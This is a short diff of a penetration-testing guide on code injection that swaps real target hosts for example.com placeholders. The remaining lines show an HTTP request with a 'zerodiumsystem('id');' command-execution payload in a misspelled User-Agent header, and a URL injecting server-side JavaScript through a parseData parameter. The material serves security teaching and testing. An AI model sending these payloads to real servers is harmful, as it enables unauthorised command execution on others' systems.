@@ -69,7 +69,7 @@ Send a normal request to make sure there are no errors, then inject the followin
 
 ```http
 GET / HTTP/1.1  
-Host: HTTP-Insecure-Requests:8080  
+Host: example
 Upgrade-Insecure-Requests: 1  
 User-Agenttt: zerodiumsystem('id');]  <--- Code Injection
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
@@ -127,7 +127,7 @@ On the target site, look for features and requests that request an external serv
 Then, in the request sent to Url, give this parameter a URL that contains a javascript code or, depending on the language in which the program works, a JavaScript code, like
 
 ```bash
-https://[REDACTED].com/cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.version+||+"Code+Injection+successful"
+https://example.com/cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.version+||+"Code+Injection+successful"
 ```
 {% endstep %}
 
